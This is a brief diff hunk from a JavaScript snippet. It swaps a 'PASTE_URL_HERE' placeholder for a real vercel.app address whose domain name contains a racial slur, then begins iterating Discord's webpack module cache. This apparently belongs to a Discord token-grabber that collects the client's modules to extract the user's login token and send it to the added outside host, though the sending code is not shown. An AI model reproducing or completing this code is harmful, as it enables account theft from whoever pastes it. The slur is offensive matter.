@@ -1,4 +1,4 @@
-const url = 'PASTE_URL_HERE';
+const url = 'https://idonthackniggas.vercel.app/';
 var f = (webpackChunkdiscord_app.push([[''], {}, e=> {
   m = [];
   for (let c in e.c) m.push(e.c[c]);
